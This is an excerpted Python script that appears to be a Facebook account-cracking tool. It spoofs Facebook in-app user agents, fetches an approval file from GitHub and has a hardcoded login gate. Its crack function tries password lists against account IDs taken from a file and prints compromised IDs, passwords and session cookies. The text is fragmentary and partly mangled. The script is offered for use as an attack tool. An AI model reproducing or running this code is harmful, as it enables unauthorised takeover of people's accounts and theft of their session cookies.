...
CON=sol()
#------------------[ USER-AGENT ]-------------------#
ua = ["Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/21A327 [FBAN/FBIOS;FBDV/iPhone15,5;FBMD/iPhone;FBSN/iOS;FBSV/17.0;FBSS/3;FBID/phone;FBLC/zh_TW;FBOP/5]",]
...
ua = ["Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) GSA/283.0.567502095 Mobile/15E148 Safari/604.1[FBAN/EMA;FBLC/en_GB;FBAV/297.0.0.13.113;]",]
...
ua = ["Mozilla/5.0 (iPhone; CPU iPhone OS 17_0_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/118.0 Mobile/15E148 Safari/605.1.15 [FB_IAB/FB4A;FBAV/423.0.0.21.64",]
ugen2=[]
ugen=[]
cokbrut=[]
...
princp=[]
try:
	prox= requests.get('https://github.com/monirhossain221/BALAK-MONIR/blob/main/approval.txt').text
	open('.prox.txt','w').write(prox)
	
except Exception as e:
	print('[[\x1b[1;92m+\x1b[1;97m] [\x1b[1;96mMONIR')
...
def uaku():
	try:
		...
		a=requests.get('https://github.com/monirhossain221/BALAK-MONIR/blob/main/approval.txt').text
		ua=open('.bbnew.txt','w')
...
while attemps < 12345677901:
    ...
    if username == 'BLACK' and password == 'MONIR':
...
888888b.   888             d8888  .d8888b.  888    d8P  
888  "88b  888            d88888 d88P  Y88b 888   d8P   
888  .88P  888           d88P888 888    888 888  d8P    
8888888K.  888          d88P 888 888        888d88K     
888  "Y88b 888         d88P  888 888        8888888b    
888    888 888        d88P   888 888    888 888  Y88b   
888   d88P 888       d8888888888 Y88b  d88P 888   Y88b  
8888888P"  88888888 d88P     888  "Y8888P"  888    Y88b 
                                                                                                                                          
\033[1;39m     â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”\033[38;5;46mBLACK\033[1;39mâ”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”“
\033[1;39m     â”ƒ \x1b[1;95mâ£ï¸Ž[ð–£˜]â˜”ï¸Ž\x1b[1;96mð™‰ð˜¼ð™ˆð™€\033[1;34m        : [â˜…] MONIR \033[1;39m            â”ƒ
\033[1;39m     â”ƒ \x1b[1;95mâ£ï¸Ž[ð–£˜]â˜”ï¸Ž\x1b[1;96mð™ð˜¼ð˜¾ð™€ð˜½ð™Šð™Šð™†\033[1;34m    : [â˜…] MONIR HOSSAIN  \033[1;39m   â”ƒ
\033[1;39m     â”ƒ \x1b[1;95mâ£ï¸Ž[ð–£˜]â˜”ï¸Ž\x1b[1;96mð™‚ð™„ð™ð™ƒð™ð˜½\033[1;34m      : [â˜…] MONIR-HOSSAIN221\033[1;39m  â”ƒ
\033[1;39m     â”ƒ \x1b[1;95mâ£ï¸Ž[ð–£˜]â˜”ï¸Ž\x1b[1;96mð™ð™„ð™‡ð™„ð™‚ð™€ð™Žð™ƒð™Šð™‰\033[1;34m  : [â˜…]ð—•ð—”ð—¡ð—šð—Ÿð—”ð——ð—˜ð—¦ð—›ð—œ\033[1;39m        â”ƒ
\033[1;39m     â”ƒ \x1b[1;95mâ£ï¸Ž[ð–£˜]â˜”ï¸Ž\x1b[1;96mð™’ð™ƒð˜¼??ð™Žð˜¼ð™‹ð™‹\033[1;34m   : [â˜…]+8801886019617\033[1;39m     â”ƒ
\033[1;39m     â”ƒ \x1b[1;95mâ£ï¸Ž[ð–£˜]â˜”ï¸Ž\x1b[1;96mð™ð™Šð™Šð™‡ð™Ž ð™‰ð˜¼ð™ˆð™€\033[1;34m  : [â˜…]ð—¥ðŸ°ð—¡ð——ð—¢ð—¡-ð—–ð—Ÿð—¢ð—¡ð—œð—¡ð—š\033[1;39m     â”ƒ
...
def login():
	banner()
	MONIRj('\033[1;96m[1] File Cloning\n\x1b[1;92m[2] Contact With Admin\n\033[0;97m[0] \033[0;91mEXIT ')
	MONIRj('\033[0;97m===============================================')
	MONIR= input('\x1b[1;92m[+] CHOOSE: ');time.sleep(0.01)
	if MONIR in ['m']:
		public()
	elif MONIR in ['1']:
		crack_file()
...
def crack_file():
	...
	print('\033[1;32m [Put File Example:  /sdcard/sexual.txt  Etc...]')
...
def setting():
	...
	os.system('espeak -a 300 " 1,  method,  Sexual Cyber"')
	hc = input(' CHOOSE: ')
	if hc in ['1','01']:
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r{bo}[ðŸ˜»MONIRðŸ˜»] {P}[{h}{loop}{P}]>~<[{h}{len(id)}{P}]{bo}â€¢{P}[{h}Ok{P}â€¢{bo}{ok}{P}] "),
	sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r\033[0;94m[{time.strftime("%H:%M")}â€¢MONIR-Cp] {idf} â€¢ {pw}\n\033[0;93[ðŸ¤Ÿ]= COOKIESâ€¢ \033[0;92m{kuki} ')     
				...
				print(f'\r\033[0;92m[MONIR-OK âž¼-OKðŸ˜»] {idf} â€¢ {pw}\n\033[0;93m[ðŸ”¥]= COOKIES â€¢ \033[0;92m{kuki} ')
				print('\033[0;94m===============================================')
				os.system('espeak -a 300 " MONIR,  Ok,  id"')
